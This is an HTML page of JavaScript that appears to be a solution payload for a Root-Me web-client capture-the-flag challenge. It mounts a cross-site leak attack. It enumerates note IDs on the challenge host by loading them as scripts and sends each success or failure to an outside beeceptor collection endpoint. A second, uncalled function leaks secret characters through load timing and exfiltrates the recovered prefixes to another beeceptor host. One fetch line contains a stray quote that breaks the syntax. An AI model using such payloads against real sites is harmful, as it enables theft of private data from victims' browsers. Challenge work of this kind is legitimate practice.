<!DOCTYPE html>
<html lang="en">
<head>
</head>
<body>
<script>
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789_', base = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/';
let id = 0;

async function findValidUrl() {
    while (true) {
        let url = base + id;
        let start = Date.now();

        const script = document.createElement('script');
        
        script.src = url;
        
        script.onload = function() {
          fetch('https://rootmeleak3.free.beeceptor.com/success?status=success&id=' + id')
        };
        
        script.onerror = function() {
          fetch('https://rootmeleak3.free.beeceptor.com/error?status=failed&id=' + id)
        };
        
        // Append the script to the document body to start loading it
        document.body.appendChild(script);

        // Attente avant la prochaine requête
        await new Promise(r => setTimeout(r, 100));
        id++;

        if(id > 2300) break;
    }
}

function makeRequest(url, added) {
    let start = Date.now();

    let obj = document.createElement('object');
    obj.data = url;
    obj.type = 'text/html';

    // Event listeners pour onload et onerror
    obj.onload = obj.onerror = () => {
        let duration = Date.now() - start;
        if (duration > 2000) {
            fetch("https://rootmeleak2.free.beeceptor.com/" + added);
            console.log("Lente :", url);
            chars.split('').forEach(c => makeRequest(url + c, added + c));
        }
    };

    // Ajout de l'élément <object> à la page (non visible)
    document.body.appendChild(obj);
}

function noteSearch(url) {
    chars.split('').forEach(c => makeRequest(url + c, c));
}

findValidUrl();

</script>
    
</body>
</html>
